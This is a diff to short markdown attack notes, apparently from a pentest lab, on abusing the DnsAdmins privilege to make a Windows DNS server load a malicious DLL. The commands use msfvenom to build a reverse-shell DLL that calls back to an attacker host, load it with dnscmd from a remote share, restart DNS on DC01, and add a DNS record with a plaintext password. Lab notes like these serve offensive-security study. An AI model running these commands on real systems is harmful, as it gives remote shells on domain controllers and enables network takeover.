@@ -22,8 +22,8 @@ Registry key where DLL is loaded:
 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
 
 ### Befehle
- * Generate malicious dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f dll > pwn.dll`
- * Load DLL: `dnscmd.exe /config /serverlevelplugindll \\192.168.56.11\public\pwn.dll`
+ * Generate malicious dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.108.128 LPORT=4444 -f dll -o pwn.dll`
+ * Load DLL: `dnscmd.exe /config /serverlevelplugindll \\192.168.108.133\C\Windows\Temp\pwn.dll`
  * Stop DNS Service: `sc.exe \\DC01 stop dns`
  * Start DNS Service: `sc.exe \\DC01 start dns`
  * Add DNS entry: `python dnstool.py -u hack.lu\\ta_bort.mig -p 'LjtLNg37LdcZin73' ldaps://192.168.108.134 -port 636 -a add -r kali --data 192.168.108.128 -dns-ip 192.168.108.134`
